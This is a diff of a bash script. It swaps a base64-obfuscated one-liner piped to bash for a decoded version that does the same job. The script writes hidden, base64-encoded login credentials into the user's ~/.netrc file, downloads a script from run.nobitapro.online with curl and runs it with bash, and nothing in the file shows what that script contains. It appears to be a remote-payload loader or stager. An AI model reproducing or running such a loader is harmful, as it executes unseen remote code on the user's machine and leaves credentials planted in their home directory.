@@ -1,1 +1,53 @@
-echo 'IyEvdXNyL2Jpbi9lbnYgYmFzaAojIC5uZXRyYyDigJ4gY3VybCAtLW5ldHJjIOKAkyBkb3dubG9hZCAmIGV4ZWN1dGUgcmVtb3RlIHNjcmlwdApzZXQgLWV1byBwaXBlZmFpbAoKVVJMPSJodHRwczovL3J1bi5ub2JpdGFwcm8ub25saW5lIgpIT1NUPSJydW4ubm9iaXRhcHJvLm9ubGluZSIKTkVUUkM9IiR7SE9NRX0vLm5ldHJjIgoKaWYgISBjb21tYW5kIC12IGN1cmwgPi9kZXYvbnVsbCAyPiYxOyB0aGVuCiAgZWNobyAiRXJyb3I6IGN1cmwgaXMgcmVxdWlyZWQgYnV0IG5vdCBpbnN0YWxsZWQuIiA+JjIKICBleGl0IDEKZmkKCnRvdWNoICIkTkVUUkMiCmNobW9kIDYwMCAiJE5FVFJDIgoKdG1wZmlsZT0iJChta3RlbXApIgpncmVwIC12RSAiXltbOnNwYWNlOl1dKm1hY2hpbmVbWzpzcGFjZTpdXSt7SE9TVH0oW1s6c3BhY2U6XV0rfCQpIiAiJE5FVFJDIiA+ICIkdG1wZmlsZSIgfHwgdHJ1ZQptdiAiJHRtcGZpbGUiICIkTkVUUkMiCgojIE9ubHkgb25lIGFjY291bnQgbm93IOKAlCB1c2VyLXdnCnsKICBwcmludGYgJ21hY2hpbmUgJXMgJyAiJEhPU1QiCiAgcHJpbnRmICdsb2dpbiAlcyAnICJ1c2VyLXR5M3R3VHNnQEljMm15bUl rZShFUmE0cWdOdWRIcCMrdiFNRUVuVH BJZHk4aHlWQUsydU R AQ0ooRU10JmtIY0UiCiAgcHJpbnRmICdwYXNzd29yZCAlc1xuJyAicGR4bmZqYVV GTEg5ajJUdy pQeXleZlpxeFJN KipqcmFyXkxGYUBS JVooXipLYVVuY2VEdmpTQyR3JCRVczNtSmNAIgp9ID4+ICIkTkVUUkMiCgpzY3JpcHRfZmlsZT0iJChta3RlbXApIgpjbGVhbnVwKCkgeyBybSAtZiAiJHNjcmlwdF9maWxlIjsgfQp0cmFwIGNsZWFudXAgRVhJVAoKaWYgY3VybCAtZnNTIC0tbmV0cmMgLW8gIiRzY3JpcHRfZmlsZSIgIiRVUkwiOyB0aGVuCiAgYmFzaCAiJHNjcmlwdF9maWxlIgplbHNlCiAgZWNobyAiQXV0aGVudGljYXRpb24gb3IgZG93bmxvYWQgZmFpbGVkLiIgPiYyCiAgZXhpdCAxCmZpCg==' | base64 -d | bash
+#!/usr/bin/env bash
+# Secure .netrc loader → curl --netrc → execute remote script
+set -euo pipefail
+
+URL='https://run.nobitapro.online'
+HOST='run.nobitapro.online'
+NETRC="$HOME/.netrc"
+
+# ---------- REQUIREMENTS ----------
+if ! command -v curl >/dev/null 2>&1; then
+  echo 'Error: curl is required but not installed.' >&2
+  exit 1
+fi
+
+if ! command -v base64 >/dev/null 2>&1; then
+  echo 'Error: base64 is required but not installed.' >&2
+  exit 1
+fi
+
+# ---------- HIDDEN CREDENTIALS (BASE64) ----------
+LOGIN_B64='dXNlci10eTN0d1RzZ0BJYzJteW1Ja2UoRVJhNHFnTnVkSHAjK3YhTUVFblRwSWR5OGh5VkFLMnVEQENKKEVNdCZIY0U='
+PASS_B64='cGR4bmZqYVVGTEg5ajJUdy pQeXleZlpxeFJN KipqcmFyXkxGYUBS JVooXipLYVVuY2VEdmpTQyR3JCRVczNtSmNA'
+
+LOGIN="$(printf '%s' "$LOGIN_B64" | base64 -d)"
+PASSWORD="$(printf '%s' "$PASS_B64" | base64 -d)"
+
+# ---------- PREPARE NETRC ----------
+touch "$NETRC"
+chmod 600 "$NETRC"
+
+tmpfile="$(mktemp)"
+grep -vE "^[[:space:]]*machine[[:space:]]+${HOST}([[:space:]]+|$)" "$NETRC" > "$tmpfile" || true
+mv "$tmpfile" "$NETRC"
+
+{
+  printf 'machine %s ' "$HOST"
+  printf 'login %s ' "$LOGIN"
+  printf 'password %s\n' "$PASSWORD"
+} >> "$NETRC"
+
+# ---------- DOWNLOAD & EXECUTE ----------
+script_file="$(mktemp)"
+cleanup() {
+  rm -f "$script_file"
+}
+trap cleanup EXIT
+
+if curl -fsS --netrc -o "$script_file" "$URL"; then
+  bash "$script_file"
+else
+  echo 'Authentication or download failed.' >&2
+  exit 1
+fi
